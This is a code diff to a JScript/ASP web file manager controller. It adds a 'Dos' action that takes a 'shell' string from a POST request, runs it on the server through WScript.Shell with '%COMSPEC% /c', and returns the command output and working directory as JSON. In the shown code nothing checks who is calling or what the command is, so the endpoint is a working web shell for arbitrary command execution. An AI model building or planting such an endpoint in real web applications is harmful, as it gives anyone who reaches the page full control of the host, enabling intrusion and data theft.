@@ -303,7 +303,7 @@ this.display('Home:Upload');
                     var stream = new nobom(charset);
                     stream.WriteText(postcontent);
                     if (stream.SaveToFile(filepath, 2)==true) {
-                     info = {
+                       info = {
                         'info': '文件编辑保存成功',
                         'status': 1
                     };
@@ -647,6 +647,61 @@ this.display('Home:Edit');
     this.assign("content", content);
     this.assign("upath", upath);
     this.display('Home:Unzip');
+});
+
+/**
+ * dos
+ * @Author   ZiShang520
+ * @DateTime 2016-01-08T11:27:24+0800
+ * @param    {String}                 ){                 if(is_ajax()){        Response.ContentType [description]
+ * @return   {[type]}                     [description]
+ */
+ HomeController.extend("Dos",function(){
+    if(is_ajax()){
+        Response.ContentType = "application/json";//设置请求头
+        var paths = F.decode(F.post('path'));//这。。。。
+        if (!is_empty(paths) && IO.is(paths) && IO.directory.exists(paths)) {
+            path = paths;
+        } else {
+            path = F.mappath("../");
+        }
+        var shell = F.post('shell');//提交的shell
+        var drive = IO.drive(path);//啪啪啪
+        var d=drive.path;//获取磁盘
+        var hpath=F.replace(path, d , '');//
+        hpath=hpath!=''?'cd '+hpath+'&':'';//获取目录
+        if (!is_empty(shell)) {
+            if (F.string.trim(shell)!='cmd') {
+                var cmd = '%COMSPEC% /c ' + d + '&' + hpath + F.string.trim(shell) + '&echo [_s_DIR_g_]&cd&echo [_s_DIR_g_]';
+                var S = new ActiveXObject("WScript.Shell");
+                var X = S.exec(cmd);//执行
+                content = X.StdOut.ReadAll();//获取返回内容
+                cmderr=str_replace(X.StdErr.ReadAll());//获取错误
+                var c=F.string.matches(content,/\[_s_DIR_g_\]((?:.|[\r\n])*)\[_s_DIR_g_\]/i);//匹配
+                var rm=!is_empty(c[0])?c[0]:'';//路径
+                var p=!is_empty(c[1])?c[1]:path;//路径
+                var p=str_replace(F.replace(p,/[\r\n]/ig,''));//去掉换行
+                var s=str_replace(F.replace(content, rm , ''))+cmderr;//核定内容
+                F.echo('{"msg":"'+s+'","path":"'+p+'"}');//返回json到前台
+            }else{
+                F.echo('{"msg":"Microsoft Windows [版本 10.0.10586]\\r\\n(c) 2015 Microsoft Corporation。保留所有权利。","path":"'+str_replace(path)+'"}');//如果提交的是cmd防止循环调用
+            }
+        }else{
+            F.echo('{"msg":"","path":"'+str_replace(path)+'"}');//没有数据就直接输出
+        }
+    }else{
+        var paths = F.decode(F.get('Path'));
+        if (!is_empty(paths) && IO.is(paths) && IO.directory.exists(paths)) {
+            filepath = paths;
+        } else {
+            filepath = F.mappath("../");
+        }
+        var upaths = IO.parent(filepath);
+        var upath = (!is_empty(upaths) && IO.is(upaths) && IO.directory.exists(upaths)) ? Mo.U('Home/Index', 'Path=' + F.encode(upaths)) : Mo.U('Home/Drive'); //生成上级路径信息
+        this.assign("filepath", filepath);
+        this.assign("upath", upath);
+        this.display('Home:Dos');
+    }
 });
 
 /**
